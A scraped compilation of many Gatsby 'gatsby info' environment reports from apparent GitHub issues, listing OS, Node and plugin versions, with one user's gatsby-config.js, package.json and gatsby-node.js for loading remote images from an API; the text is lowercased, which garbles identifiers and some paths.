gatsby-remark-responsive-iframe: ~2.4.10 => 2.4.10 gatsby-source-filesystem: ~2.3.18 => 2.3.18 gatsby-source-youtube-v2: ^1.0.1 => 1.0.1 gatsby-transformer-remark: ^2.8.23 => 2.8.23 gatsby-transformer-sharp: ~2.5.10 => 2.5.10 npmglobalpackages: gatsby-cli: 2.12.59
system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i5-6360u cpu @ 2.00ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.5.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 78.0.1 safari: 13.1 npmpackages: gatsby: 2.23.11 => 2.23.11 gatsby-image: ^2.4.4 => 2.4.13 gatsby-plugin-anchor-links: ^1.1.1 => 1.1.1 gatsby-plugin-facebook-pixel: ^1.0.3 => 1.0.3 gatsby-plugin-google-analytics: ^2.3.6 => 2.3.11 gatsby-plugin-manifest: ^2.4.5 => 2.4.18 gatsby-plugin-offline: ^3.2.3 => 3.2.17 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.10 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-s3: ^0.3.3 => 0.3.3 gatsby-plugin-sharp: ^2.6.10 => 2.6.19 gatsby-plugin-sitemap: ^2.4.11 => 2.4.11 gatsby-plugin-smoothscroll: ^1.1.0 => 1.1.0 gatsby-plugin-styled-components: ^3.3.2 => 3.3.10 gatsby-source-filesystem: ^2.3.4 => 2.3.19 gatsby-source-shopify: ^3.2.14 => 3.2.20 gatsby-source-strapi: 0.0.12 => 0.0.12 gatsby-transformer-sharp: ^2.5.4 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.37
system: os: linux 5.3 ubuntu 18.04.4 lts (bionic beaver) cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 4.4.20 - /bin/bash binaries: node: 12.18.2 - /usr/local/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 78.0.1 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-plugin-typescript: 2.4.14 => 2.4.14 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.60
system: os: windows 10 10.0.19041 cpu: (4) x64 intel(r) core(tm) i7-4610m cpu @ 3.00ghz binaries: node: 14.4.0 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.6 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 browsers: edge: 44.19041.1.0 npmglobalpackages: gatsby-cli: 2.12.60
``` system: os: macos 10.15.3 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.5.0 - ~/.nvm/versions/node/v14.5.0/bin/node yarn: 1.22.4 - ~/.yvm/shim/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.5.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 edge: 83.0.478.61 firefox: 76.0 safari: 13.0.5
system: os: macos 10.15.5 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.6 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 78.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.24.2 => 2.24.2 gatsby-cli: ^2.12.60 => 2.12.60 gatsby-image: ^2.4.5 => 2.4.13 gatsby-plugin-manifest: ^2.4.9 => 2.4.18 gatsby-plugin-offline: ^3.2.7 => 3.2.17 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.10 gatsby-plugin-sharp: ^2.6.9 => 2.6.19 gatsby-plugin-styled-components: ^3.3.4 => 3.3.10 gatsby-plugin-transition-link: ^1.20.2 => 1.20.2 gatsby-source-filesystem: ^2.3.8 => 2.3.19 gatsby-transformer-sharp: ^2.5.3 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.1
system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.1 - /usr/local/bin/node npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 safari: 13.1 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.44
``` system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-8559u cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 12.18.1 - /var/folders/28/wcd3h4fn6y33tl_65x3lpp0w0000gq/t/yarn--1594418651189-0.1116926118957724/node yarn: 1.22.4 - /var/folders/28/wcd3h4fn6y33tl_65x3lpp0w0000gq/t/yarn--1594418651189-0.1116926118957724/yarn npm: 6.14.6 - ~/.nvm/versions/node/v12.18.1/bin/npm languages: python: 3.7.6 - /usr/local/opt/python/libexec/bin/python browsers: chrome: 83.0.4103.116 firefox: 68.0.2 safari: 13.1.1
system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.3 - /bin/zsh binaries: node: 10.20.1 - ~/.nvm/versions/node/v10.20.1/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v10.20.1/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 83.0.4103.116 firefox: 77.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.21.33 => 2.21.33 gatsby-cli: ^2.12.15 => 2.12.21 gatsby-image: ^2.0.23 => 2.3.2 gatsby-plugin-canonical-urls: ^2.3.9 => 2.3.9 gatsby-plugin-manifest: ^2.4.2 => 2.4.2 gatsby-plugin-netlify: ^2.0.6 => 2.2.1 gatsby-plugin-netlify-cms: ^4.1.6 => 4.2.2 gatsby-plugin-offline: ^3.2.1 => 3.2.1 gatsby-plugin-purgecss: ^4.0.0 => 4.0.1 gatsby-plugin-react-helmet: ^3.0.4 => 3.2.2 gatsby-plugin-sass: ^2.0.7 => 2.2.1 gatsby-plugin-sharp: ^2.2.9 => 2.5.4 gatsby-plugin-typescript: ^2.3.3 => 2.3.3 gatsby-remark-copy-linked-files: ^2.0.7 => 2.2.1 gatsby-remark-images: ^3.1.6 => 3.2.2 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-filesystem: ^2.0.26 => 2.2.2 gatsby-transformer-remark: ^2.6.9 => 2.7.1 gatsby-transformer-sharp: ^2.1.9 => 2.4.4
``` system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-4980hq cpu @ 2.80ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.3.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 safari: 13.1.1 npmpackages: gatsby: ^2.24.1 => 2.24.1 gatsby-image: ^2.2.34 => 2.2.34 gatsby-plugin-emotion: ^4.1.18 => 4.1.18 gatsby-plugin-feed: ^2.5.11 => 2.5.11 gatsby-plugin-gtag: ^1.0.13 => 1.0.13 gatsby-plugin-manifest: ^2.3.6 => 2.3.6 gatsby-plugin-offline: ^3.2.17 => 3.2.17 gatsby-plugin-polished: ^1.0.3 => 1.0.4 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-remote-images: ^1.0.1 => 1.0.7 gatsby-plugin-robots-txt: ^1.4.0 => 1.5.0 gatsby-plugin-sharp: ^2.6.19 => 2.6.19 gatsby-plugin-sitemap: ^2.0.11 => 2.2.19 gatsby-plugin-typography: ^2.4.3 => 2.4.3 gatsby-source-filesystem: ^2.2.4 => 2.2.4 gatsby-source-wordpress: ^3.3.21 => 3.3.21 gatsby-transformer-sharp: ^2.5.11 => 2.5.11 npmglobalpackages: gatsby-cli: 2.11.13
system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i7-7700k cpu @ 4.20ghz binaries: node: 12.16.3 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.2 browsers: edge: 44.18362.449.0 npmpackages: gatsby: 2.23.20 => 2.23.20 gatsby-awesome-pagination: 0.3.6 => 0.3.6 gatsby-image: 2.4.12 => 2.4.12 gatsby-plugin-advanced-sitemap: 1.5.5 => 1.5.5 gatsby-plugin-catch-links: 2.3.10 => 2.3.10 gatsby-plugin-feed: 2.5.10 => 2.5.10 gatsby-plugin-force-trailing-slashes: 1.0.4 => 1.0.4 gatsby-plugin-manifest: 2.4.17 => 2.4.17 gatsby-plugin-offline: 3.2.16 => 3.2.16 gatsby-plugin-react-helmet: 3.3.9 => 3.3.9 gatsby-plugin-sharp: 2.6.17 => 2.6.17 gatsby-source-filesystem: 2.3.18 => 2.3.18 gatsby-source-ghost: 4.0.5 => 4.0.5 gatsby-transformer-sharp: 2.5.10 => 2.5.10 npmglobalpackages: gatsby-cli: 2.12.60
system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 12.14.0 - ~/.nvm/versions/node/v12.14.0/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.14.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 72.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.23.7 => 2.24.1 gatsby-image: ^2.2.7 => 2.2.34 gatsby-plugin-google-tagmanager: ^2.1.9 => 2.1.18 gatsby-plugin-less: ^3.0.4 => 3.0.15 gatsby-plugin-mailchimp: ^5.1.2 => 5.1.2 gatsby-plugin-manifest: ^2.2.4 => 2.2.30 gatsby-plugin-mdx: ^1.2.15 => 1.2.15 gatsby-plugin-offline: ^2.2.4 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.2 => 3.1.16 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.2.9 => 2.3.4 gatsby-plugin-sitemap: ^2.2.26 => 2.2.26 gatsby-plugin-styled-components: ^3.1.3 => 3.1.14 gatsby-plugin-typescript: ^2.1.5 => 2.1.20 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.1.7 => 2.1.39 gatsby-source-graphql: ^2.1.3 => 2.1.25 gatsby-transformer-sharp: ^2.2.5 => 2.3.6
system: os: macos 10.15.5 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.8.0 - ~/.nvm/versions/node/v13.8.0/bin/node yarn: 1.22.4 - /usr/local/cellar/yvm/3.6.7/shim/yarn npm: 6.13.6 - ~/.nvm/versions/node/v13.8.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 safari: 13.1.1 npmpackages: gatsby: ^2.22.21 => 2.23.22 gatsby-image: ^2.2.7 => 2.2.41 gatsby-link: ^2.2.22 => 2.2.29 gatsby-plugin-eslint: ^2.0.4 => 2.0.8 gatsby-plugin-google-tagmanager: ^2.1.3 => 2.1.25 gatsby-plugin-i18next: ^1.1.7 => 1.1.10 gatsby-plugin-react-helmet: ^3.1.1 => 3.1.22 gatsby-plugin-react-svg: ^2.1.1 => 2.1.2 gatsby-plugin-resolve-src: ^2.0.0 => 2.0.0 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.4.0 => 2.4.5 gatsby-plugin-styled-components: ^3.1.1 => 3.1.19 gatsby-react-router-scroll: ^3.0.2 => 3.0.2 gatsby-source-contentful: ^2.3.14 => 2.3.14 gatsby-source-filesystem: ^2.1.46 => 2.1.48 gatsby-transformer-remark: ^2.6.3 => 2.6.51 gatsby-transformer-sharp: ^2.3.0 => 2.3.14
system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.5.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 safari: 13.1.1 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-postcss: ^2.3.9 => 2.3.9 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-remark-images: ^3.3.17 => 3.3.17 gatsby-remark-normalize-paths: ^1.0.0 => 1.0.0 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-remark: ^2.8.23 => 2.8.23 gatsby-transformer-sharp: ^2.5.7 => 2.5.7
system: os: windows 10 10.0.18362 cpu: (4) x64 intel(r) core(tm) i3-3217u cpu @ 1.80ghz binaries: node: 14.1.0 - c:\\program files\ odejs\ ode.exe npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 - /c/users/louis/.windows-build-tools/python27/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.23.11 => 2.23.22 gatsby-image: ^2.0.39 => 2.4.12 gatsby-plugin-feed-mdx: ^1.0.0 => 1.0.1 gatsby-plugin-google-analytics: ^2.0.18 => 2.3.10 gatsby-plugin-manifest: ^2.0.29 => 2.4.17 gatsby-plugin-mdx: ^1.2.14 => 1.2.22 gatsby-plugin-netlify-cms: ^4.3.7 => 4.3.10 gatsby-plugin-offline: ^2.0.25 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.12 => 3.3.9 gatsby-plugin-sharp: ^2.0.35 => 2.6.18 gatsby-plugin-styled-components: ^3.0.7 => 3.3.9 gatsby-plugin-typography: ^2.2.13 => 2.5.9 gatsby-remark-copy-linked-files: ^2.0.11 => 2.3.10 gatsby-remark-images: ^3.3.9 => 3.3.17 gatsby-remark-responsive-iframe: ^2.1.1 => 2.4.10 gatsby-remark-smartypants: ^2.0.9 => 2.3.9 gatsby-remark-vscode: ^2.1.2 => 2.1.2 gatsby-source-filesystem: ^2.0.29 => 2.3.18 gatsby-transformer-sharp: ^2.1.18 => 2.5.10 npmglobalpackages: gatsby-cli: 2.12.59
system: os: macos 10.15.5 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.12.0 - /usr/local/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.11.3 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 edge: 80.0.361.62 firefox: 51.0 safari: 13.1.1 npmpackages: gatsby: ^2.21.37 => 2.21.37 gatsby-image: ^2.4.4 => 2.4.4 gatsby-plugin-manifest: ^2.4.5 => 2.4.5 gatsby-plugin-offline: ^3.2.3 => 3.2.3 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-remove-trailing-slashes: ^2.3.10 => 2.3.10 gatsby-plugin-sass: ^2.3.3 => 2.3.3 gatsby-plugin-sharp: ^2.6.4 => 2.6.4 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-sharp: ^2.5.2 => 2.5.2 npmglobalpackages: gatsby-cli: 2.12.34
system: os: windows 10 10.0.17763 cpu: (4) x64 intel(r) core(tm) i7-8700k cpu @ 3.70ghz binaries: node: 12.16.3 - c:\\program files\ odejs\ ode.exe npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.59
``` system: os: linux 4.4 ubuntu 18.04.4 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 4.4.20 - /bin/bash binaries: node: 13.12.0 - /usr/bin/node yarn: 1.22.4 - /mnt/c/users/marcelm/appdata/roaming/npm/yarn npm: 6.14.4 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.23.18 => 2.23.22
(if relevant) <!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here.
--> ### file contents (if changed) `gatsby-config.js`:
const api_url = 'api-url';
module.exports = { plugins: [ 'gatsby-plugin-react-helmet', { resolve: 'gatsby-plugin-page-creator', options: { path: `${__dirname}/src/pages` } }, { resolve: 'gatsby-plugin-sass', options: { precision: 8 } }, 'gatsby-transformer-sharp', 'gatsby-plugin-sharp', { resolve: 'gatsby-plugin-manifest', options: { name: 'potimarrants', short_name: 'poti', start_url: '/', background_color: '#ffffff', theme_color: '#663399', display: 'minimal-ui', icon: `${__dirname}/src/images/favicon.png` } }, { resolve: 'gatsby-source-filesystem', options: { path: `${__dirname}/src/images/`, name: 'images' } }, { resolve: 'gatsby-source-apiserver', options: { url: `${api_url}/gatsby`, method: 'get', headers: { 'content-type': 'application/json' }, typeprefix: 'internal__', name: 'accounts', verboseoutput: true } } ]
``` `package.json`: ```json
{ "private": true, "version": "0.0.1", "main": "gatsby-config.js", "dependencies": { "@material-ui/core": "^4.9.14", "@material-ui/icons": "^4.9.1", "animejs": "^3.0.1", "antd": "^4.0.4", "bootstrap": "^4.5.0", "dotenv": "^8.2.0", "gatsby": "^2.13.6", "gatsby-image": "^2.2.4", "gatsby-plugin-manifest": "^2.2.1", "gatsby-plugin-offline": "^2.2.1", "gatsby-plugin-page-creator": "^2.1.2", "gatsby-plugin-react-helmet": "^3.1.0", "gatsby-plugin-sass": "^2.1.0", "gatsby-plugin-sharp": "^2.2.3", "gatsby-source-apiserver": "^2.1.4", "gatsby-source-filesystem": "^2.1.2", "gatsby-source-prismic-graphql": "^3.3.1", "gatsby-transformer-sharp": "^2.2.1", "jest": "^24.9.0", "node-sass": "^4.12.0", "prismic-reactjs": "^1.1.2", "prop-types": "^15.7.2", "react": "^16.13.1", "react-bootstrap": "^1.0.1", "react-dom": "^16.8.6", "react-helmet": "^5.2.1" }, "devdependencies": { "eslint": "^6.8.0", "eslint-config-airbnb": "^18.1.0", "eslint-plugin-import": "^2.20.2", "eslint-plugin-jsx-a11y": "^6.2.3", "eslint-plugin-react": "^7.20.0", "eslint-plugin-react-hooks": "^2.5.1", "prettier": "^1.18.2" }, "keywords": [ "gatsby", "gatsby-theme" ], "license": "mit", "scripts": { "build": "gatsby build", "predevelop": "gatsby clean", "develop": "gatsby develop", "format": "prettier --write src/**/*.{js,jsx}", "lint": "eslint .", "start": "npm run develop", "serve": "gatsby serve", "test": "jest src/" }, "jest": { "verbose": true }
``` `gatsby-node.js`:
const { createremotefilenode } = require('gatsby-source-filesystem');
const path = require(\'path\'); exports.createschemacustomization = ({ actions }) => { const { createtypes } = actions; createtypes(` type show { id: string slug: string title: string cover: string featuredcover: file @link(from: "featuredimg___node") } type optionsfile { id: string name: string url: string! img___node: file @link(from: "img___node") } type options { files: [optionsfile] } type element { id: string position: string type: string options: options alternative_children: [element] } type structure { hompage: element showpage: element } type internal__accounts implements node { id: string shows: [show] structure: structure } `);
}; const createimgfluidnode = async ( file, store, cache, createnode, createnodeid
) => { const fluidnode = await createremotefilenode({ url: file.url, parentnodeid: file.id, createnode, createnodeid, cache, store }); return fluidnode.id;
}; const createimgfluidelement = async ( element, createnode, store, cache, createnodeid
) => { if (array.isarray(element.options.files)) { element.options.files.foreach(async (file, index) => { const filenodeid = await createimgfluidnode( file, store, cache, createnode, createnodeid ); // if the file was created, attach the new node to the parent node if (filenodeid) { // eslint-disable-next-line no-param-reassign element.options.files[index].img___node = filenodeid; // eslint-disable-next-line no-console console.info(`charge file ${file.url} in node ${filenodeid}`); } }); } if (array.isarray(element.alternative_children)) { element.alternative_children.foreach(async child => { await createimgfluidelement( child, createnode, store, cache, createnodeid ); }); } return element;
}; const createimgfluidshow = async ( show, store, cache, createnode, createnodeid
) => { const filenodeid = createimgfluidnode( { url: show.cover, id: show.id }, store, cache, createnode, createnodeid ); return filenodeid;
}; exports.oncreatenode = async ({ node, actions: { createnode }, store, cache, createnodeid
}) => { const nodeclone = node; // for all markdownremark nodes that have a featured image url, call createremotefilenode if ( nodeclone.id !== 'dummy' && nodeclone.internal.type === 'internal__accounts' ) { const shows = nodeclone.shows.filter( show => show.cover !== null || show.cover !== undefined ); shows.foreach(async (show, index) => { const filenodeid = await createimgfluidshow( show, store, cache, createnode, createnodeid ); // if the file was created, attach the new node to the parent node if (filenodeid) { // eslint-disable-next-line no-param-reassign nodeclone.shows[index].featuredimg___node = filenodeid; // eslint-disable-next-line no-console console.info( `charge cover ${filenodeid} for show ${show.id} ${show.slug}` ); } }); if ( nodeclone.structure !== undefined && nodeclone.structure.homepage !== undefined ) { nodeclone.structure.homepage = await createimgfluidelement( nodeclone.structure.homepage, createnode, store, cache, createnodeid ); } }
}; exports.createpages = ({ graphql, actions }) => { const { createpage } = actions; const showpage = path.resolve(\'./src/templates/showpage.tsx\'); return graphql( ` { allinternalaccounts(filter: { id: { ne: "dummy" } }) { edges { node { id shows { title slug } } } } } ` ).then(result => { if (result.errors) { throw result.errors; } else { const accounts = result.data.allinternalaccounts.edges; accounts.foreach(account => { const pages = account.node.shows; pages.foreach(page => { if (page.slug) { createpage({ path: `/${page.slug}`, component: showpage, context: { title: page.title, slug: page.slug, accountid: account.node.id } }); } }); }); } return null; });
``` `gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: windows 10 10.0.18362 cpu: (4) x64 intel(r) core(tm) i3-3217u cpu @ 1.80ghz binaries: node: 14.1.0 - c:\\program files\ odejs\ ode.exe npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.23.11 => 2.23.22 gatsby-image: ^2.0.39 => 2.4.12 gatsby-plugin-feed-mdx: ^1.0.0 => 1.0.1 gatsby-plugin-google-analytics: ^2.0.18 => 2.3.10 gatsby-plugin-manifest: ^2.0.29 => 2.4.17 gatsby-plugin-mdx: ^1.2.14 => 1.2.22 gatsby-plugin-netlify-cms: ^4.3.7 => 4.3.10 gatsby-plugin-offline: ^2.0.25 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.12 => 3.3.9 gatsby-plugin-sharp: ^2.0.35 => 2.6.18 gatsby-plugin-styled-components: ^3.0.7 => 3.3.9 gatsby-plugin-typography: ^2.2.13 => 2.5.9 gatsby-remark-copy-linked-files: ^2.0.11 => 2.3.10 gatsby-remark-images: ^3.3.9 => 3.3.17 gatsby-remark-responsive-iframe: ^2.1.1 => 2.4.10 gatsby-remark-smartypants: ^2.0.9 => 2.3.9 gatsby-source-filesystem: ^2.0.29 => 2.3.18 gatsby-transformer-sharp: ^2.1.18 => 2.5.10 npmglobalpackages: gatsby-cli: 2.12.59
system: os: macos mojave 10.14.6 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 12.18.0 - ~/.nvm/versions/node/v12.18.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.18.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 safari: 13.1.1 npmpackages: gatsby: ~2.13.x => 2.13.83 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ~2.4.12 => 2.4.12 gatsby-plugin-catch-links: ~2.3.10 => 2.3.10 gatsby-plugin-emotion: ~2.0.5 => 2.0.7 gatsby-plugin-favicon: ~3.1.5 => 3.1.6 gatsby-plugin-google-gtag: ~2.1.9 => 2.1.9 gatsby-plugin-manifest: ~2.4.17 => 2.4.17 gatsby-plugin-mdx: ^1.2.22 => 1.2.22 gatsby-plugin-postcss: ~2.3.9 => 2.3.9 gatsby-plugin-react-helmet: ~3.3.9 => 3.3.9 gatsby-plugin-remove-generator: ^1.0.5 => 1.0.5 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-robots-txt: ~1.5.1 => 1.5.1 gatsby-plugin-root-import: ~2.0.5 => 2.0.5 gatsby-plugin-sharp: ~2.6.18 => 2.6.18 gatsby-plugin-sitemap: ~2.4.10 => 2.4.10 gatsby-remark-autolink-headers: ^2.3.10 => 2.3.10 gatsby-remark-copy-linked-files: ^2.3.10 => 2.3.10 gatsby-remark-external-links: ~0.0.4 => 0.0.4 gatsby-remark-images: ~3.3.17 => 3.3.17 gatsby-remark-relative-images: ^0.2.2 => 0.2.3 gatsby-remark-responsive-iframe: ~2.4.10 => 2.4.10 gatsby-source-filesystem: ~2.3.18 => 2.3.18 gatsby-source-youtube-v2: ^1.0.1 => 1.0.1 gatsby-transformer-remark: ^2.8.23 => 2.8.23 gatsby-transformer-sharp: ~2.5.10 => 2.5.10 npmglobalpackages: gatsby-cli: 2.12.59
system: os: linux 5.7 arch linux cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.8 - /usr/bin/zsh
binaries: node: 14.5.0 - /usr/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.6 - /usr/bin/npm
languages: python: 3.8.3 - /usr/bin/python
npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-sharp: ^2.5.7 => 2.5.7
npmglobalpackages: gatsby: 2.22.17
``` system: os: macos 10.15.5 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 3.2.57 - /bin/bash binaries: node: 14.5.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 safari: 13.1.1 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-sharp: ^2.5.7 => 2.5.7
system: os: windows 10 10.0.18363 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz binaries: node: 12.12.0 - c:\\program files\ odejs\ ode.exe npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.1 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-gtag: ^1.0.13 => 1.0.13 gatsby-plugin-material-ui: ^2.1.9 => 2.1.9 gatsby-plugin-react-helmet: ^3.3.9 => 3.3.9 gatsby-plugin-sass: ^2.3.10 => 2.3.10 npmglobalpackages: gatsby-cli: 2.12.48
system: os: macos mojave 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 10.13.0 - /usr/local/bin/node yarn: yarn install v0.27.5
info no lockfile found.
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success saved lockfile.
done in 68.28s
